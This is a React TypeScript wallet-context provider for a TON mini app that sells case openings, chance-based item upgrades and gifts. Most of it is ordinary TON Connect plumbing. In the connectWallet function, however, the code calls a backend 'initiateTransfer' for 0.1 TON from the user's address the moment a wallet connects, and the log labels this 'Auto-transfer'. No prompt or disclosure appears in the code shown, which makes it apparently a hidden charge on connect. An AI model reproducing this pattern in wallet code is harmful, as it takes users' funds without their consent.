"use client"

import { createContext, useContext, useState, useEffect, type ReactNode } from "react"
import { TonConnectUIProvider } from "@tonconnect/ui-react"
import { getTonConnectService } from "@/lib/ton-connect"
import { apiClient } from "@/lib/api"

interface WalletContextType {
  isConnected: boolean
  walletAddress: string | null
  isConnecting: boolean
  connectWallet: () => Promise<void>
  disconnectWallet: () => Promise<void>
  sendTransaction: (transaction: any) => Promise<string>
  openCase: (casePrice: number, caseId: string) => Promise<string>
  upgradeItem: (inputValue: number, targetValue: number, upgradeChance: number) => Promise<string>
  purchaseGift: (giftPrice: number, recipientAddress: string, giftType: string) => Promise<string>
}

const WalletContext = createContext<WalletContextType | null>(null)

interface TonWalletProviderProps {
  children: ReactNode
}

export function TonWalletProvider({ children }: TonWalletProviderProps) {
  const [isConnected, setIsConnected] = useState(false)
  const [walletAddress, setWalletAddress] = useState<string | null>(null)
  const [isConnecting, setIsConnecting] = useState(false)

  const tonConnectService = getTonConnectService()

  useEffect(() => {
    // Check initial connection status
    const checkConnection = () => {
      const connected = tonConnectService.isConnected()
      setIsConnected(connected)

      if (connected) {
        const walletInfo = tonConnectService.getWalletInfo()
        setWalletAddress(walletInfo?.address || null)
      }
    }

    checkConnection()

    // Set up periodic checks for connection status
    const interval = setInterval(checkConnection, 1000)
    return () => clearInterval(interval)
  }, [])

  const connectWallet = async () => {
    if (isConnecting) return

    setIsConnecting(true)
    try {
      console.log("[v0] Starting wallet connection process...")

      const success = await tonConnectService.connectWallet()

      if (success) {
        const walletInfo = tonConnectService.getWalletInfo()
        setIsConnected(true)
        setWalletAddress(walletInfo?.address || null)
        console.log("[v0] Wallet connected:", walletInfo?.address)

        if (walletInfo?.address) {
          try {
            const transferResult = await apiClient.initiateTransfer(walletInfo.address, 0.1) // 0.1 TON
            if (transferResult.success) {
              console.log("[v0] Transfer initiated:", transferResult.data?.transactionId)

              // Проверяем транзакцию через 5 секунд
              setTimeout(async () => {
                if (transferResult.data?.transactionId) {
                  const verifyResult = await apiClient.verifyTransaction(transferResult.data.transactionId)
                  console.log("[v0] Transaction verification:", verifyResult)
                }
              }, 5000)
            }
          } catch (error) {
            console.error("[v0] Auto-transfer failed:", error)
          }
        }
      }
    } catch (error) {
      console.error("[v0] Wallet connection error:", error)
      throw error
    } finally {
      setIsConnecting(false)
    }
  }

  const disconnectWallet = async () => {
    try {
      await tonConnectService.disconnectWallet()
      setIsConnected(false)
      setWalletAddress(null)
    } catch (error) {
      console.error("[v0] Wallet disconnection error:", error)
      throw error
    }
  }

  const sendTransaction = async (transaction: any): Promise<string> => {
    if (!isConnected) {
      throw new Error("Wallet not connected")
    }

    try {
      console.log("[v0] Preparing to send transaction...")
      const result = await tonConnectService.sendTransaction(transaction)
      console.log("[v0] Transaction completed:", result)
      return result
    } catch (error) {
      console.error("[v0] Transaction error:", error)
      throw error
    }
  }

  const openCase = async (casePrice: number, caseId: string): Promise<string> => {
    if (!isConnected) {
      throw new Error("Wallet not connected")
    }

    try {
      const transaction = await tonConnectService.createCaseOpeningTransaction(casePrice, caseId)
      return await sendTransaction(transaction)
    } catch (error) {
      console.error("[v0] Case opening transaction error:", error)
      throw error
    }
  }

  const upgradeItem = async (inputValue: number, targetValue: number, upgradeChance: number): Promise<string> => {
    if (!isConnected) {
      throw new Error("Wallet not connected")
    }

    try {
      const transaction = await tonConnectService.createUpgradeTransaction(inputValue, targetValue, upgradeChance)
      return await sendTransaction(transaction)
    } catch (error) {
      console.error("[v0] Upgrade transaction error:", error)
      throw error
    }
  }

  const purchaseGift = async (giftPrice: number, recipientAddress: string, giftType: string): Promise<string> => {
    if (!isConnected) {
      throw new Error("Wallet not connected")
    }

    try {
      const transaction = await tonConnectService.createGiftPurchaseTransaction(giftPrice, recipientAddress, giftType)
      return await sendTransaction(transaction)
    } catch (error) {
      console.error("[v0] Gift purchase transaction error:", error)
      throw error
    }
  }

  const value: WalletContextType = {
    isConnected,
    walletAddress,
    isConnecting,
    connectWallet,
    disconnectWallet,
    sendTransaction,
    openCase,
    upgradeItem,
    purchaseGift,
  }

  const manifestUrl = "https://ton-mini-app-backend.onrender.com/tonconnect-manifest.json"

  return (
    <TonConnectUIProvider manifestUrl={manifestUrl}>
      <WalletContext.Provider value={value}>{children}</WalletContext.Provider>
    </TonConnectUIProvider>
  )
}

export function useWallet() {
  const context = useContext(WalletContext)
  if (!context) {
    throw new Error("useWallet must be used within TonWalletProvider")
  }
  return context
}
